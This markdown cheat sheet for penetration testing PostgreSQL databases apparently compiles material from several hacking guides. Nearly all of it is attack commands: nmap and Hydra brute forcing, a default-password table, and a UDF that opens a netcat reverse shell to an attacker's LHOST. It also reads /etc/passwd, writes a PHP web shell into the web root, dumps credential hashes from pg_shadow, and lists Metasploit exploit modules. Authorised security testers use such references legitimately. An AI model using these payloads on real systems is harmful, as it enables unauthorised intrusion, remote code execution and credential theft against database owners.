# PostgreSQL

PostgreSQL default port: `5432/tcp`

## Nmap

    nmap -sV -sC TARGET_IP -p 5432

### Small brute force

    nmap -sV -sC TARGET_IP -p 5432 --script pgsql-brute

## Client 

    psql -h TARGET_IP -U USERNAME -W PASSWORD DATABASE

## Default Passwords

|Username|Password|
|:-------|:-------|
|postgres|postgres|
|postgres|password|
|postgres|admin|
|admin|admin|
|admin|password|

## Password Cracking

> Hydra

    hydra -L user.txt -P pass.txt TARGET_IP postgres

> Metasploit 

    use auxiliary/scanner/postgres/postgres_login

## COMMAND EXECUTION

```sql
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;
SELECT sys('nc -e /bin/sh LHOST LPORT');
```

> Metasploit

    use exploit/multi/postgres/postgres_copy_from_program_cmd_exec

## Read file 
```sql
create table hack(file TEXT);
COPY hack FROM '/etc/passwd';
select * from hack;
```

## Write file 
```sql
create table hack(put TEXT);
INSERT INTO hack(put) VALUES('<?php echo system("$_REQUEST[cmd]");?>');
COPY hack(put) TO '/var/www/html/shell.php';
```

## Querys

> List databases
```sql
SELECT dataname FROM pg_database;
```

> Get BD version 
```sql
SELECT version();
```

> Get credentials 
```sql
SELECT username, passwd FROM pg_shadow;
```

## Dumping the database

```zsh
pg_dump --host=TARGET_IP --username=USERNAME --password --dbname=DATABASE --table='TABLE' -f output_pgdump
```

## Metasploit postgresql modules

> Enumeration
```
auxiliary/scanner/postgres/postgres_dbname_flag_injection
auxiliary/scanner/postgres/postgres_login
auxiliary/scanner/postgres/postgres_version
```


> POST-Exploit
```
auxiliary/admin/postgres/postgres_readfile
auxiliary/admin/postgres/postgres_sql
auxiliary/scanner/postgres/postgres_hashdump
auxiliary/server/capture/postgresql
exploit/linux/postgres/postgres_payload
exploit/windows/postgres/postgres_payload
```

## Source 

- https://medium.com/@lordhorcrux_/ultimate-guide-postgresql-pentesting-989055d5551e
- https://medium.com/@netscylla/pentesters-guide-to-postgresql-hacking-59895f4f007
- https://book.hacktricks.xyz/pentesting/pentesting-postgresql
- https://www.hackingarticles.in/penetration-testing-on-postgresql-5432/
